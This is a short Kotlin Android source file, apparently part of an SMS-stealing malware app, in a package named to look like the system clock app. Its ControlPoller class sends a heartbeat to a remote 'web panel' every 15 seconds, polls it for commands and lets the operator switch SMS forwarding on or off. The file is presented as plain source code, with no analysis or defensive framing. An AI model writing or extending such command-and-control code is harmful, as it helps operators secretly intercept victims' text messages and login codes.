package com.android.declock

import android.content.Context
import android.os.Handler
import android.os.Looper
import org.json.JSONObject

class ControlPoller(private val context: Context) {
    private val handler = Handler(Looper.getMainLooper())
    private val prefs = context.getSharedPreferences("sms_panel", Context.MODE_PRIVATE)
    private val tick = object : Runnable {
        override fun run() {
            WebPanelSender.heartbeat(context)
            WebPanelSender.poll(context) { commands -> commands.forEach(::applyCommand) }
            handler.postDelayed(this, 15_000)
        }
    }
    fun start() { handler.post(tick) }
    fun stop() { handler.removeCallbacks(tick) }
    private fun applyCommand(command: JSONObject) {
        if (command.optString("type") == "forwarding_enabled") prefs.edit().putBoolean("forwarding_enabled", command.optBoolean("value", true)).apply()
    }
}
